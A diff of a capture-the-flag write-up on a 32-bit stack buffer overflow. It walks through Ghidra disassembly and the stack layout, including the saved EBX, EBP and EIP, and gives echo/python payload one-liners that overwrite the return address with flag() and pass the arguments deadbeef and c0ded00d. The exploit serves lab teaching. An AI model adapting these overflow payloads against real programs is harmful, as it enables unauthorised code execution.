@@ -19,7 +19,7 @@ Ok let hack it!
 
 ## Disassemble it
 
-Use Ghidra to disassmble the binary:
+Use Ghidra to disassemble the binary:
 
 - main():
 
@@ -123,6 +123,7 @@ Non-debugging symbols:
 
 flag() address = 0x080491e2
 
+[![Watch the video](docs/flag_address.png)](docs/flag_address.mp4)
 
 ## Stack overflow attack
 http://unixwiz.net/techtips/win32-callconv-asm.html
@@ -139,6 +140,10 @@ stack                                           stack
 
 We should write 184 dummy bytes then 0x080491e2 to the `local_bc`
 
+Build up our attack script: 
+```s
+echo -ne $(python3 -c "print('A'*184 + '\xe2\x91\x04\x08')") | ./vuln
+```
 
 flag(int param_1, int param_2):
 ```s
@@ -151,9 +156,6 @@ stack                                                                           
 ```
 
 
-```s
-python3 -c "print('A'*184 + '\xe2\x91\x04\x08')" | ./vuln
-```
 
 Look like it's not correct!.
 
@@ -187,7 +189,7 @@ $(python3 -c "print('A'*184, end='')")\
 '\x0d\xd0\xde\xc0' | ./vuln
 ```
 
-Look likt it does not work.
+Look like it does not work.
 I need to do some searches and find out that we can observe the stack crash via `dmesg` on the local target file.
 So somehow it takes extra 4 bytes
 
@@ -207,15 +209,30 @@ top of                                                  bottom of
 stack                                                   stack
 ```
 
+Later on I found that the Unknown 4 bytes stack is for EBX push action:
+
+![alt text](docs/ebx.png)
+
+
+
+```s
+bottom of                                               top of
+memory                                                  memory
+            local_bc       EBX       EBP        EIP
+<------   [ 180 bytes ] [4 bytes] [4 bytes] [ 4 bytes ]
+top of                                                  bottom of
+stack                                                   stack
+```
+
 Then we have to modify the script to take it down: 
 
 ```s
 {
 echo -ne $(python3 -c "print('A'*(180), end='')")   
-echo -ne 'BBBB' # unknown
+echo -ne 'BBBB' # EBX register
 echo -ne 'CCCC' # EBP
-echo -ne '\xe2\x91\x04\x08'  #EIP
-echo -ne 'DDDD' # Dummy
+echo -ne '\xe2\x91\x04\x08'  #EIP - Overwrite with the return address of flag()
+echo -ne 'DDDD' # Dummy EIP Return address after flag() function is called
 echo -ne '\xef\xbe\xad\xde' # deadbeef
 echo -ne '\x0d\xd0\xde\xc0' # c0ded00d
 }
